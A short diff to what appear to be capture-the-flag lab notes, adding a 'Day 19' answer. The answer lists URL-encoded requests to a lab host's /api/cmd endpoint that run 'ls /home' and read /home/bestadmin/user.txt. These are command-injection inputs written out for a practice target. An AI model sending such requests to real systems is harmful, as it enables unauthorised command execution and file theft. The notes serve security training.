@@ -96,6 +96,16 @@ ELF JS
 ```
 
 
+***Day 19***
+```
+Commands
+#1 What are the contents of user.txt file?
+: @Method
+: http://10.10.71.172:3000/api/cmd/ls%20%2fhome
+: http://10.10.71.172:3000/api/cmd/cat%20%2Fhome%2Fbestadmin%2Fuser.txt
+
+```
+
 
 
 
